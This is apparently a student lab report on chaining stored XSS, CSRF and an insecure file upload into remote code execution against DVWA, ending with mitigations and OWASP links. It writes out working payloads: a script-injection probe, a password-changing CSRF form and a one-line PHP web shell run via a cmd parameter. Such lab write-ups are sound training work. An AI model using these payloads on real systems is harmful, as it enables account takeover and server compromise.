# Lab Report: DVWA - XSS to CSRF to File Upload RCE

---

## Objective
Demonstrate how a chained attack on a web app (DVWA) can escalate from a simple XSS bug to full remote code execution by abusing CSRF and insecure file upload.

---

## Lab Setup
- **Target:** DVWA (Damn Vulnerable Web Application)
- **Attacker:** Kali Linux
- **Tools:** Burp Suite, browser, curl, netcat

---

## Recon
- Identify input fields.
- Test with payloads: `<script>alert(1)</script>`.
- Use Burp to intercept, modify, repeat requests.

---

## Exploitation

### 1️⃣ Stored XSS
- Find comment section or profile field that reflects input.
- Inject `<script>` to steal cookies or deface page.
- Prove session hijack by capturing cookie & reusing in new browser session.

### 2️⃣ CSRF
- Craft CSRF PoC:
```html
<form action="http://<target>/change_password.php" method="POST">
<input type="hidden" name="password" value="newpass123">
<input type="hidden" name="confirm_password" value="newpass123">
<input type="submit" value="Submit">
</form>
````

* Deliver to victim (simulate click).
* Confirm password changed without auth.

### 3️⃣ File Upload → RCE

* Use Burp to bypass file extension filter.
* Upload a PHP reverse shell (`<?php system($_GET['cmd']); ?>`).
* Trigger it via browser: `http://<target>/uploads/shell.php?cmd=whoami`.

---

## Post-Exploitation

* Prove code execution (`id`, `uname -a`).
* Connect back with netcat.
* Enumerate server context.

---

## Mitigation

* Sanitize input
* Implement CSP
* CSRF tokens
* Strict file validation on upload
* Remove web shells & harden web root permissions

---

## Screenshots

![XSS proof](screenshots/xss_popup.png)
![CSRF PoC](screenshots/csrf_exploit.png)
![RCE proof](screenshots/rce_shell.png)

---

## References

* [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
* [OWASP CSRF Guide](https://owasp.org/www-community/attacks/csrf)
* [OWASP File Upload Guidelines](https://owasp.org/www-community/attacks/Unrestricted_File_Upload)
